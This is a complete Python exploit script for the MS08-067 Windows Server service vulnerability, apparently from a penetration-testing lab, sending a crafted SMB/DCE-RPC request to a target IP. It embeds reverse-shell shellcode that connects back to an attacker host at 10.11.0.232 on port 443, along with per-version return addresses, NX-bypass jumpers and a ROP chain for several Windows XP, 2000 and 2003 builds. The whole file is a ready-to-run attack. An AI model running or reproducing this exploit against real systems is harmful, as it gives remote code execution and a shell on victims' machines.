#!/usr/bin/env python
import struct
import time
import sys
from threading import Thread  # Thread is imported incase you would like to modify

try:
    from impacket import smb
    from impacket import uuid
    #from impacket.dcerpc import dcerpc
    from impacket.dcerpc.v5 import transport
except ImportError, _:
    print 'Install the following library to make this script work'
    print 'Impacket : https://github.com/CoreSecurity/impacket.git'
    print 'PyCrypto : https://pypi.python.org/pypi/pycrypto'
    sys.exit(1)

# ------------------------------------------------------------------------
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.232 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows 
shellcode=(
"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x82\x54\xe5\x9c\x83\xee\xfc\xe2\xf4\x7e\xbc\x67\x9c\x82\x54"
"\x85\x15\x67\x65\x25\xf8\x09\x04\xd5\x17\xd0\x58\x6e\xce\x96"
"\xdf\x97\xb4\x8d\xe3\xaf\xba\xb3\xab\x49\xa0\xe3\x28\xe7\xb0"
"\xa2\x95\x2a\x91\x83\x93\x07\x6e\xd0\x03\x6e\xce\x92\xdf\xaf"
"\xa0\x09\x18\xf4\xe4\x61\x1c\xe4\x4d\xd3\xdf\xbc\xbc\x83\x87"
"\x6e\xd5\x9a\xb7\xdf\xd5\x09\x60\x6e\x9d\x54\x65\x1a\x30\x43"
"\x9b\xe8\x9d\x45\x6c\x05\xe9\x74\x57\x98\x64\xb9\x29\xc1\xe9"
"\x66\x0c\x6e\xc4\xa6\x55\x36\xfa\x09\x58\xae\x17\xda\x48\xe4"
"\x4f\x09\x50\x6e\x9d\x52\xdd\xa1\xb8\xa6\x0f\xbe\xfd\xdb\x0e"
"\xb4\x63\x62\x0b\xba\xc6\x09\x46\x0e\x11\xdf\x3c\xd6\xae\x82"
"\x54\x8d\xeb\xf1\x66\xba\xc8\xea\x18\x92\xba\x85\xab\x30\x24"
"\x12\x55\xe5\x9c\xab\x90\xb1\xcc\xea\x7d\x65\xf7\x82\xab\x30"
"\xcc\xd2\x04\xb5\xdc\xd2\x14\xb5\xf4\x68\x5b\x3a\x7c\x7d\x81"
"\x72\xf6\x87\x3c\xef\x97\x82\xbc\x8d\x9e\x82\x55\x5e\x15\x64"
"\x3e\xf5\xca\xd5\x3c\x7c\x39\xf6\x35\x1a\x49\x07\x94\x91\x90"
"\x7d\x1a\xed\xe9\x6e\x3c\x15\x29\x20\x02\x1a\x49\xea\x37\x88"
"\xf8\x82\xdd\x06\xcb\xd5\x03\xd4\x6a\xe8\x46\xbc\xca\x60\xa9"
"\x83\x5b\xc6\x70\xd9\x9d\x83\xd9\xa1\xb8\x92\x92\xe5\xd8\xd6"
"\x04\xb3\xca\xd4\x12\xb3\xd2\xd4\x02\xb6\xca\xea\x2d\x29\xa3"
"\x04\xab\x30\x15\x62\x1a\xb3\xda\x7d\x64\x8d\x94\x05\x49\x85"
"\x63\x57\xef\x05\x81\xa8\x5e\x8d\x3a\x17\xe9\x78\x63\x57\x68"
"\xe3\xe0\x88\xd4\x1e\x7c\xf7\x51\x5e\xdb\x91\x26\x8a\xf6\x82"
"\x07\x1a\x49"
)
# ------------------------------------------------------------------------
num_nops = 410 - len(shellcode)
newshellcode = "\x90" * num_nops
newshellcode += shellcode  
shellcode = newshellcode  
nonxjmper = "\x08\x04\x02\x00%s" + "A" * 4 + "%s" + "A" * 42 + "\x90" * 8 + "\xeb\x62" + "A" * 10
disableNXjumper = "\x08\x04\x02\x00%s%s%s" + "A" * 28 + "%s" + "\xeb\x02" + "\x90" * 2 + "\xeb\x62"
ropjumper = "\x00\x08\x01\x00" + "%s" + "\x10\x01\x04\x01";
module_base = 0x6f880000

def generate_rop(rvas):
    gadget1 = "\x90\x5a\x59\xc3"
    gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]
    gadget3 = "\xcc\x90\xeb\x5a"
    ret = struct.pack('<L', 0x00018000)
    ret += struct.pack('<L', rvas['call_HeapCreate'] + module_base)
    ret += struct.pack('<L', 0x01040110)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget1
    ret += struct.pack('<L', rvas['mov [eax], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget2[0]
    ret += gadget2[1]
    ret += struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget2[2]
    ret += struct.pack('<L', rvas['mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['add eax, 8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget3
    return ret

class SRVSVC_Exploit(Thread):
    def __init__(self, target, os, port=445):
        super(SRVSVC_Exploit, self).__init__()
        self.port = port
        self.target = target
        self.os = os

    def __DCEPacket(self):
        if (self.os == '1'):
            print 'Windows XP SP0/SP1 Universal\n'
            ret = "\x61\x13\x00\x01"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '2'):
            print 'Windows 2000 Universal\n'
            ret = "\xb0\x1c\x1f\x00"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '3'):
            print 'Windows 2003 SP0 Universal\n'
            ret = "\x9e\x12\x00\x01"  
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '4'):
            print 'Windows 2003 SP1 English\n'
            ret_dec = "\x8c\x56\x90\x7c"  
            ret_pop = "\xf4\x7c\xa2\x7c"  
            jmp_esp = "\xd3\xfe\x86\x7c"  
            disable_nx = "\x13\xe4\x83\x7c"  
            jumper = disableNXjumper % (
                ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
        elif (self.os == '5'):
            print 'Windows XP SP3 French (NX)\n'
            ret = "\x07\xf8\x5b\x59"  
            disable_nx = "\xc2\x17\x5c\x59"  
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '6'):
            print 'Windows XP SP3 English (NX)\n'
            ret = "\x07\xf8\x88\x6f"  
            disable_nx = "\xc2\x17\x89\x6f"  
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '7'):
            print 'Windows XP SP3 English (AlwaysOn NX)\n'
            rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796, 'pop ecx / ret': 0x2e796 + 6,
                'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f, 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56, 'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64}
            jumper = generate_rop(rvasets) + "AB"
        else:
            print 'Not supported OS version\n'
            sys.exit(-1)
        print '[-]Initiating connection'
        if (self.port == '445'):
            self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
        else:
            self.__trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % self.target, dstport = int(self.port), filename = '\\browser' )
        self.__trans.connect()
        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
        path = "\x5c\x00" + "ABCDEFGHIJ" * 10 + shellcode + "\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00" + jumper + "\x00" * 2
        server = "\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix = "\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
        MaxCount = "\x36\x01\x00\x00"  
        Offset = "\x00\x00\x00\x00"
        ActualCount = "\x36\x01\x00\x00" 
        self.__stub = server + MaxCount + Offset + ActualCount + \
            path + "\xE8\x03\x00\x00" + prefix + "\x01\x10\x00\x00\x00\x00\x00\x00"        
        return

    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub)
        time.sleep(3)
        print 'Exploit finish\n'

if __name__ == '__main__':
       try:
           target = sys.argv[1]
           os = sys.argv[2]
           port = sys.argv[3]
       except IndexError:
                print '\nUsage: %s <target ip> <os #> <Port #>\n' % sys.argv[0]
                print 'Example: ms08-067.py 10.11.1.227 1 445 -- Windows XP SP0/SP1 Universal, port 445'
                print 'Example: ms08-067.py 10.11.1.227 2 139 -- Windows 2000 Universal, port 139 (445 could also be used)'
                print 'Example: ms08-067.py 10.11.1.227 3 445 -- Windows 2003 SP0 Universal'
                print 'Example: ms08-067.py 10.11.1.227 4 445 -- Windows 2003 SP1 English'
                print 'Example: ms08-067.py 10.11.1.227 5 445 -- Windows XP SP3 French (NX)'
                print 'Example: ms08-067.py 10.11.1.227 6 445 -- Windows XP SP3 English (NX)'
                print 'Example: ms08-067.py 10.11.1.227 7 445 -- Windows XP SP3 English (AlwaysOn NX)'
                print ''
                print '[+] nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1'
                print ''
                sys.exit(-1)

current = SRVSVC_Exploit(target, os, port)
current.start()
